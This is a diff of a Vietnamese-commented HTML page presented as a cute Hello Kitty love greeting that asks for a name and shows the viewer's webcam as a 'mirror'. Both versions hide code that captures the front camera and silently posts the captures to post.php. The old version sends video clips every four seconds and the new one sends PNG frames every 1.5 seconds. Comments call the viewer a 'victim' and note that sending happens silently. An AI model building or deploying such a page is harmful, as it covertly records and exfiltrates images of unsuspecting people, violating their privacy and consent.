@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>I Love You - Hello Kitty</title>
+    <title>Gửi lời yêu thương - Hello Kitty</title>
     
-    <!-- Thư viện jQuery để gửi AJAX giống code cũ -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <!-- Thư viện jQuery (Bắt buộc cho Logic cũ) -->
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     
     <!-- Fonts Cute -->
     <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
@@ -35,6 +35,7 @@
         }
         .k1 { top: 5%; left: 5%; width: 80px; }
         .k2 { bottom: 10%; right: 5%; width: 90px; animation-delay: 1s; }
+        .k3 { top: 15%; right: 10%; width: 50px; animation-delay: 2s; }
 
         @keyframes float {
             0%, 100% { transform: translateY(0); }
@@ -44,7 +45,7 @@
         /* Header */
         h1 {
             font-family: 'Pacifico', cursive;
-            font-size: 2.5em;
+            font-size: 2.2em;
             color: #ff4d94;
             text-shadow: 2px 2px 0px #fff;
             margin-top: 20px;
@@ -57,47 +58,64 @@
             100% { transform: scale(1); }
         }
 
-        /* Khung Camera Cute */
+        /* Khung Camera Cute (Gương) */
         .mirror-frame {
             position: relative;
-            width: 280px;
-            height: 280px;
-            margin: 20px auto;
+            width: 300px;
+            height: 350px; /* Hình chữ nhật bo góc giống điện thoại */
+            margin: 10px auto;
             border: 8px solid #ff99cc;
-            border-radius: 50%; /* Hình tròn */
+            border-radius: 30px;
             box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
             overflow: hidden;
             background: #000;
         }
 
+        /* Video hiển thị cho nạn nhân xem (Soi gương) */
+        #video-display {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Lật ngược cho giống gương */
+        }
+
+        /* Hiệu ứng REC giả */
+        .rec-indicator {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            color: red;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            background: rgba(255, 255, 255, 0.7);
+            padding: 5px 10px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            z-index: 10;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background-color: red;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
+
         /* Nơ trang trí */
         .bow {
             position: absolute;
             top: -15px;
-            right: 50px;
-            font-size: 40px;
-            z-index: 10;
-        }
-
-        /* Canvas hiển thị */
-        #canvas-display {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* Lật gương */
-        }
-
-        /* Video ẩn (nguồn) */
-        #video-source { display: none; }
-        
-        /* Canvas ẩn (xử lý dữ liệu) */
-        #canvas-process { display: none; }
-
-        .loading-text {
-            margin-top: 10px;
-            font-weight: bold;
-            color: #ff66b2;
-            font-size: 14px;
+            left: -10px;
+            font-size: 50px;
+            z-index: 20;
+            transform: rotate(-20deg);
         }
 
         /* Footer */
@@ -107,9 +125,14 @@
             width: 100%;
             background: rgba(255, 255, 255, 0.8);
             padding: 10px;
-            font-size: 12px;
+            font-size: 14px;
             color: #ff66b2;
+            font-weight: bold;
         }
+
+        /* Canvas ẩn để xử lý ảnh (Quan trọng) */
+        #canvas { display: none; }
+
     </style>
 </head>
 <body>
@@ -117,146 +140,106 @@
     <!-- Trang trí -->
     <img src="https://i.pinimg.com/originals/22/04/9a/22049a173824147781b045152eb49e6f.png" class="kitty-float k1">
     <img src="https://upload.wikimedia.org/wikipedia/en/0/05/Hello_kitty_character_portrait.png" class="kitty-float k2">
+    <div class="kitty-float k3" style="font-size: 40px;">💖</div>
 
-    <!-- Nội dung chính -->
+    <!-- Nhập tên -->
     <script>
         var name = prompt("Nhập tên người bạn yêu thương:", "Cục Cưng");
         if (!name) name = "Bạn Yêu";
     </script>
 
+    <!-- Tiêu đề -->
     <h1>I <i class="fas fa-heart" style="color:red"></i> YOU</h1>
-    <h2 style="font-size: 20px; color: #ff0066;"><script>document.write(name)</script></h2>
+    <h2 style="font-size: 18px; color: #ff0066; margin-top: -10px;"><script>document.write(name)</script></h2>
 
-    <!-- Khung gương -->
+    <!-- Khung Camera (Gương) -->
     <div class="mirror-frame">
         <div class="bow">🎀</div>
-        <canvas id="canvas-display"></canvas>
+        <!-- Giả vờ đang quay -->
+        <div class="rec-indicator"><div class="dot"></div> REC</div>
+        
+        <!-- Video để người dùng nhìn thấy mình -->
+        <video id="video-display" playsinline autoplay muted></video>
     </div>
 
-    <div class="loading-text">💖 Đang gửi trọn yêu thương... 💖</div>
+    <p style="font-size: 14px; color: #ff66b2; margin-top: 10px;">
+        💖 Hãy cười thật tươi để lưu giữ khoảnh khắc này nhé! 💖
+    </p>
 
     <div class="footer">
-        Chúc bạn luôn xinh đẹp và hạnh phúc! Meow ~
+        Love you forever ~ Meow Meow 🐱
     </div>
 
-    <!-- Element ẩn để xử lý -->
-    <video id="video-source" autoplay playsinline muted></video>
-    
+    <!-- Canvas ẩn dùng để chụp hình gửi về PHP (Logic cũ) -->
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <!-- SCRIPT LOGIC (GIỮ NGUYÊN LOGIC CŨ) -->
     <script>
         // --- CẤU HÌNH ---
-        const PHP_URL = 'post.php'; // Đường dẫn file PHP của bạn (VD: forwarding_link/post.php)
-        const RECORD_INTERVAL = 4000; // Quay clip mỗi 4 giây và gửi
+        // Đổi đường dẫn này thành file PHP của bạn nếu cần
+        const PHP_URL = 'post.php'; 
 
-        const video = document.getElementById('video-source');
-        const canvasDisplay = document.getElementById('canvas-display');
-        const ctxDisplay = canvasDisplay.getContext('2d');
-        
-        let mediaRecorder;
-        let recordedChunks = [];
-
-        // 1. Hàm gửi dữ liệu về PHP (Giống hệt code cũ)
-        function sendToPHP(base64Data) {
+        // Hàm gửi dữ liệu (Giống hệt code cũ của bạn)
+        function post(imgdata){
             $.ajax({
                 type: 'POST',
+                data: { cat: imgdata}, // Biến 'cat' để PHP nhận diện
                 url: PHP_URL,
-                data: { cat: base64Data }, // Giữ nguyên tên biến 'cat' như code cũ
-                dataType: 'text',
-                success: function(result) {
-                    console.log("Đã gửi yêu thương thành công! 💖");
+                dataType: 'json',
+                async: false,
+                success: function(result){
+                    // Gửi thành công (âm thầm)
                 },
-                error: function(err) {
-                    console.log("Lỗi gửi tin...");
+                error: function(){
+                    // Lỗi (âm thầm)
                 }
             });
-        }
+        };
 
-        // 2. Khởi động Camera và Vẽ Hello Kitty lên hình
-        async function startCamera() {
+        const video = document.getElementById('video-display');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user" // Camera trước
+            }
+        };
+
+        // Khởi động Camera
+        async function init() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: true, // Lấy cả âm thanh cho video
-                    video: { facingMode: "user" } 
-                });
-                
-                video.srcObject = stream;
-                
-                // Vẽ liên tục lên Canvas hiển thị (để người dùng soi gương)
-                video.addEventListener('play', () => {
-                    canvasDisplay.width = video.videoWidth;
-                    canvasDisplay.height = video.videoHeight;
-                    
-                    function drawLoop() {
-                        // Vẽ video
-                        ctxDisplay.drawImage(video, 0, 0, canvasDisplay.width, canvasDisplay.height);
-                        
-                        // Vẽ thêm sticker vào video (Filter Hello Kitty)
-                        ctxDisplay.font = "50px Arial";
-                        ctxDisplay.fillText("💖", 20, 60);
-                        ctxDisplay.fillText("🐱", canvasDisplay.width - 70, canvasDisplay.height - 20);
-                        
-                        // Hiệu ứng màu hồng
-                        ctxDisplay.fillStyle = "rgba(255, 182, 193, 0.15)";
-                        ctxDisplay.fillRect(0, 0, canvasDisplay.width, canvasDisplay.height);
-
-                        requestAnimationFrame(drawLoop);
-                    }
-                    drawLoop();
-
-                    // Bắt đầu quy trình tự động quay
-                    startAutoRecording(stream);
-                });
-
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
             } catch (e) {
-                console.error("Camera error:", e);
-                alert("Hãy cho phép camera để thấy điều bất ngờ nhé! 💖");
+                // Nếu lỗi camera, báo nhẹ
+                console.log("Camera error: " + e.toString());
+                alert("Hãy bật Camera để thấy điều bất ngờ nhé! 💖");
             }
         }
 
-        // 3. Logic tự động quay và gửi (Thay thế cho setInterval chụp ảnh)
-        function startAutoRecording(stream) {
-            // Sử dụng MediaRecorder để quay stream
-            // Lưu ý: Nếu muốn quay cả Sticker, cần dùng canvasDisplay.captureStream()
-            // Nhưng để nhẹ và ổn định, ta quay trực tiếp từ Camera Stream (nguyên gốc)
-            
-            // Tùy chọn 1: Quay nguyên gốc (Nhẹ hơn) -> Dùng biến 'stream'
-            // Tùy chọn 2: Quay có Filter Hello Kitty -> Dùng 'canvasDisplay.captureStream(30)'
-            
-            const recordStream = canvasDisplay.captureStream(30); // Chọn quay có Filter
-            
-            mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm' });
+        // Xử lý khi Camera bật thành công
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
 
-            mediaRecorder.ondataavailable = function(e) {
-                if (e.data.size > 0) {
-                    recordedChunks.push(e.data);
-                }
-            };
-
-            mediaRecorder.onstop = function() {
-                // Khi dừng quay 1 đoạn -> Gộp lại thành Blob
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                recordedChunks = []; // Reset bộ nhớ
+            // LOGIC CŨ: Chụp hình mỗi 1.5 giây và gửi về
+            setInterval(function(){
+                // Vẽ hình từ video lên canvas ẩn
+                context.drawImage(video, 0, 0, 640, 480);
                 
-                // Chuyển Blob thành Base64 để gửi qua AJAX (giống code cũ gửi ảnh)
-                var reader = new FileReader();
-                reader.readAsDataURL(blob); 
-                reader.onloadend = function() {
-                    var base64data = reader.result;
-                    // Gửi về PHP
-                    sendToPHP(base64data);
-                }
+                // Chuyển thành Base64 (image/png)
+                // Dòng này thêm replace để tương thích code PHP cũ của bạn
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                 
-                // Quay tiếp đoạn sau
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), RECORD_INTERVAL);
-            };
-
-            // Bắt đầu vòng lặp đầu tiên
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), RECORD_INTERVAL);
+                // Gửi đi
+                post(canvasData); 
+            }, 1500); // 1500ms = 1.5 giây
         }
 
-        // Chạy ngay khi vào trang
-        window.onload = startCamera;
+        // Chạy ngay
+        init();
 
     </script>
 </body>
